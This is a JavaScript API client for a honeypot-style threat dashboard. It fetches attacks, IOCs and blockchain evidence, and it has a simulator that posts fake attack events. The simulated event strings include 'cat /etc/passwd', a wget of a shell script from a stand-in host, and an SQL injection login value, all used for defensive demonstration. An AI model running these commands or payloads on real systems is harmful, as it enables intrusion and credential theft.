// Connects to live Render backend by default on Vercel and remote hosts
export function getBaseUrl() {
  if (typeof window !== 'undefined') {
    const host = window.location.hostname;
    // On Vercel or any remote production domain, ALWAYS use live Render backend
    if (host.includes('vercel.app') || (host !== 'localhost' && host !== '127.0.0.1' && !host.startsWith('192.168.'))) {
      return 'https://kurukshetra-backend.onrender.com';
    }
  }
  if (import.meta.env.VITE_API_URL && !import.meta.env.VITE_API_URL.includes('127.0.0.1') && !import.meta.env.VITE_API_URL.includes('localhost')) {
    return import.meta.env.VITE_API_URL.replace(/\/$/, '');
  }
  return 'https://kurukshetra-backend.onrender.com';
}

const BASE_URL = getBaseUrl();

// ── Fast Storage Cache Helper for Instant UI Hydration ───────────────────────
export function getCached(key, maxAgeMs = 120000) {
  try {
    const item = localStorage.getItem(`kurukshetra_${key}`);
    if (!item) return null;
    const parsed = JSON.parse(item);
    if (Date.now() - parsed.ts < maxAgeMs) {
      return parsed.data;
    }
  } catch {}
  return null;
}

export function setCached(key, data) {
  try {
    if (data) {
      localStorage.setItem(`kurukshetra_${key}`, JSON.stringify({ ts: Date.now(), data }));
    }
  } catch {}
}

async function apiFetch(path, options = {}) {
  const url = `${BASE_URL}${path}`;
  const controller = new AbortController();
  const timeoutMs = options.timeout || 10000;
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const res = await fetch(url, {
      headers: { 'Content-Type': 'application/json', ...options.headers },
      signal: controller.signal,
      ...options,
    });
    clearTimeout(timeoutId);
    if (!res.ok) {
      const text = await res.text().catch(() => '');
      throw new Error(`[${res.status}] ${path}: ${text}`);
    }
    const ct = res.headers.get('content-type') || '';
    if (ct.includes('application/json')) return res.json();
    return null;
  } catch (err) {
    clearTimeout(timeoutId);
    throw err;
  }
}

// ─── Health ──────────────────────────────────────────────────────────────────
export const checkHealth = () => apiFetch('/health', { timeout: 4000 });

// ─── Dashboard ───────────────────────────────────────────────────────────────
export const fetchDashboardSummary = async () => {
  try {
    const data = await apiFetch('/api/dashboard/summary');
    if (data) setCached('dashboard_summary', data);
    return data;
  } catch (err) {
    const cached = getCached('dashboard_summary');
    if (cached) return cached;
    throw err;
  }
};

// ─── Attacks / Sessions ──────────────────────────────────────────────────────
export const fetchAttacks = async () => {
  try {
    const data = await apiFetch('/api/attacks');
    if (data && Array.isArray(data)) setCached('attacks_list', data);
    return data;
  } catch (err) {
    const cached = getCached('attacks_list');
    if (cached) return cached;
    throw err;
  }
};

export const fetchSessionDetails = (id) => apiFetch(`/api/sessions/${id}`);
export const containSession = (id) =>
  apiFetch(`/api/sessions/${id}/contain`, { method: 'POST' });

// ─── IOCs ────────────────────────────────────────────────────────────────────
export const fetchIOCs = async () => {
  try {
    const data = await apiFetch('/api/iocs');
    if (data) setCached('iocs_list', data);
    return data;
  } catch (err) {
    const cached = getCached('iocs_list');
    if (cached) return cached;
    throw err;
  }
};

// ─── Attacker DNA ────────────────────────────────────────────────────────────
export const fetchAttackers = async () => {
  try {
    const data = await apiFetch('/api/attackers');
    if (data) setCached('attackers_list', data);
    return data;
  } catch (err) {
    const cached = getCached('attackers_list');
    if (cached) return cached;
    throw err;
  }
};

// ─── MITRE ATT&CK ────────────────────────────────────────────────────────────
export const fetchMitre = async (sessionId) => {
  try {
    const data = await apiFetch(sessionId ? `/api/mitre/${sessionId}` : '/api/mitre');
    if (data && !sessionId) setCached('mitre_list', data);
    return data;
  } catch (err) {
    if (!sessionId) {
      const cached = getCached('mitre_list');
      if (cached) return cached;
    }
    throw err;
  }
};

// ─── Reports ─────────────────────────────────────────────────────────────────
export const fetchReport = (sessionId) => apiFetch(`/api/reports/${sessionId}`);

// ─── AI Threat Landscape & Vulnerability Guard ──────────────────────────────
export const fetchAIThreatAnalysis = (limit = 40) =>
  apiFetch(`/api/ai/threat-analysis?limit=${limit}`);

export const explainEventWithAI = (eventData) =>
  apiFetch('/api/ai/explain-event', { method: 'POST', body: JSON.stringify(eventData) });

export const fetchVulnerabilityGuard = () =>
  apiFetch('/api/ai/vulnerability-guard');

// ─── Blockchain Evidence Integrity ──────────────────────────────────────────
export const fetchBlockchainSummary = async () => {
  try {
    const data = await apiFetch('/api/blockchain/verify');
    if (data) setCached('blockchain_summary', data);
    return data;
  } catch (err) {
    const cached = getCached('blockchain_summary');
    if (cached) return cached;
    throw err;
  }
};

export const verifyEvidence = (evidenceId) =>
  apiFetch(`/api/blockchain/verify/${evidenceId}`);

export const fetchBlockchainBlocks = (limit = 50) =>
  apiFetch(`/api/blockchain/blocks?limit=${limit}`);

export const triggerTamperDemo = () =>
  apiFetch('/api/blockchain/demo-tamper', { method: 'POST' });

export const restoreTamperDemo = () =>
  apiFetch('/api/blockchain/demo-restore', { method: 'POST' });

// ─── One-Click Simulator ─────────────────────────────────────────────────────
// Sends a full multi-stage attack campaign to the live backend (schema-compliant).
const SIM_IPS = [
  '185.220.101.45', '23.129.64.101', '45.142.212.100',
  '194.165.16.77', '62.102.148.69', '109.70.100.23',
];
const TARGET_IP = '10.0.0.100';

const SSH_CAMPAIGN = [
  { event_type: 'auth_attempt', event: 'Failed password for root', metadata: { username: 'root', success: false } },
  { event_type: 'auth_attempt', event: 'Failed password for admin', metadata: { username: 'admin', success: false } },
  { event_type: 'auth_attempt', event: 'Accepted password for root', metadata: { username: 'root', success: true } },
  { event_type: 'command', event: 'whoami', metadata: { cwd: '/root' } },
  { event_type: 'command', event: 'uname -a', metadata: {} },
  { event_type: 'command', event: 'cat /etc/passwd', metadata: {} },
  { event_type: 'decoy_access', event: 'cat /root/fake-credentials.txt', metadata: { resource: 'fake-credentials', is_decoy: true } },
  { event_type: 'command', event: 'wget http://malware.xyz/shell.sh -O /tmp/x.sh', metadata: {} },
  { event_type: 'command', event: 'sudo -l', metadata: {} },
];

const WEB_CAMPAIGN = [
  { event_type: 'http_request', event: 'GET /robots.txt', metadata: { method: 'GET', path: '/robots.txt', user_agent: 'Nikto/2.1.6' } },
  { event_type: 'http_request', event: 'GET /admin', metadata: { method: 'GET', path: '/admin', user_agent: 'curl/7.68.0' } },
  { event_type: 'decoy_access', event: 'GET /fake-config', metadata: { resource: 'fake-config', is_decoy: true } },
  { event_type: 'auth_attempt', event: "POST /login admin' OR '1'='1", metadata: { username: 'admin', injection: true } },
];

function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function evtId(sessionId, n) { return `EVT-SIM-${sessionId.slice(-8)}-${String(n).padStart(3, '0')}`; }

async function postEvent(payload) {
  return apiFetch('/api/events', { method: 'POST', body: JSON.stringify(payload) });
}

export async function runAttackSimulation() {
  const service = Math.random() > 0.5 ? 'ssh' : 'web';
  const ip = pick(SIM_IPS);
  const sessionId = `ATK-SIM-${Date.now().toString(36).toUpperCase()}`;
  const events = service === 'ssh' ? SSH_CAMPAIGN : WEB_CAMPAIGN;
  const ts = () => new Date().toISOString();

  let last = null;
  for (let i = 0; i < events.length; i++) {
    const e = events[i];
    last = await postEvent({
      event_id: evtId(sessionId, i + 1),
      session_id: sessionId,
      source_ip: ip,
      target_ip: TARGET_IP,
      service,
      timestamp: ts(),
      event_type: e.event_type,
      event: e.event,
      metadata: { ...e.metadata, simulation: true, campaign: 'dashboard_one_click' },
    });
    await new Promise(r => setTimeout(r, 350));
  }
  return last;
}
